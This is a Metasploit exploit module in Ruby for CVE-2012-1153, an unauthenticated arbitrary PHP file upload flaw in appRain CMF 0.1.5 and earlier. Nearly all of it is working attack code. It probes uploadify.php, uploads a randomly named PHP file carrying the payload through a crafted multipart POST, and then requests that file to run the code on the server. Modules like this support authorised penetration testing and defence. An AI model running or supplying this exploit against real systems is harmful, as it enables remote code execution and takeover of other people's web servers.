# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "appRain CMF Arbitrary PHP File Upload Vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in appRain&#039;s Content Management
        Framework (CMF), version 0.1.5 or less.  By abusing the uploadify.php file, a
        malicious user can upload a file to the uploads/ directory without any
        authentication, which results in arbitrary code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;EgiX&#039;,   #Discovery, PoC
          &#039;sinn3r&#039;  #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2012-1153&#039;],
          [&#039;OSVDB&#039;, &#039;78473&#039;],
          [&#039;EDB&#039;, &#039;18392&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;appRain 0.1.5 or less&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jan 19 2012",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to appRain&#039;, &#039;/appRain-q-0.1.5&#039;])
        ], self.class)
  end

  def check
    uri = target_uri.path
    uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "#{uri}addons/uploadify/uploadify.php"
    })

    if res and res.code == 200 and res.body.empty?
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    uri = target_uri.path
    uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;

    peer = "#{rhost}:#{rport}"
    payload_name = Rex::Text.rand_text_alpha(rand(10) + 5) + &#039;.php&#039;

    post_data = "--o0oOo0o\r\n"
    post_data << "Content-Disposition: form-data; name=\"Filedata\"; filename=\"#{payload_name}\"\r\n\r\n"
    post_data << "<?php "
    post_data << payload.encoded
    post_data << " ?>\r\n"
    post_data << "--o0oOo0o\r\n"

    print_status("#{peer} - Sending PHP payload (#{payload_name})")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => "#{uri}addons/uploadify/uploadify.php",
      &#039;ctype&#039;  => &#039;multipart/form-data; boundary=o0oOo0o&#039;,
      &#039;data&#039;   => post_data
    })

    # If the server returns 200 and the body contains our payload name,
    # we assume we uploaded the malicious file successfully
    if not res or res.code != 200 or res.body !~ /#{payload_name}/
      print_error("#{peer} - I don&#039;t think the file was uploaded. Abort!")
      return
    end

    print_status("#{peer} - Executing PHP payload (#{payload_name})")
    # Execute our payload
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "#{uri}addons/uploadify/uploads/#{payload_name}"
    })

    # If we don&#039;t get a 200 when we request our malicious payload, we suspect
    # we don&#039;t have a shell, either.  Print the status code for debugging purposes.
    if res and res.code != 200
      print_status("#{peer} - Server returns #{res.code.to_s}")
    end
  end
end



